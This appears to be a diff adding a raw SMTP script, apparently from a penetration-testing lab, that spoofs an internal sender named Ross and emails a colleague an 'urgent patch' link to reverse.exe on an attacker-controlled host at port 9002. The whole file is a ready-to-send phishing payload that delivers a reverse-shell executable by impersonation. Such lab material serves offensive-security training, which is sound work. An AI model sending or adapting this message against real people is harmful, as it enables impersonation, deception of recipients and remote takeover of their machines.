@@ -1,0 +1,14 @@
+HELO VICTIM
+MAIL FROM: <rmurray@victim>
+RCPT TO: <tharper@victim>
+DATA
+Subject: This is an urgent patch please install!
+
+Please install this urgent patch
+
+http://192.168.119.243:9002/reverse.exe
+
+Sincerly, Ross
+
+.
+QUIT
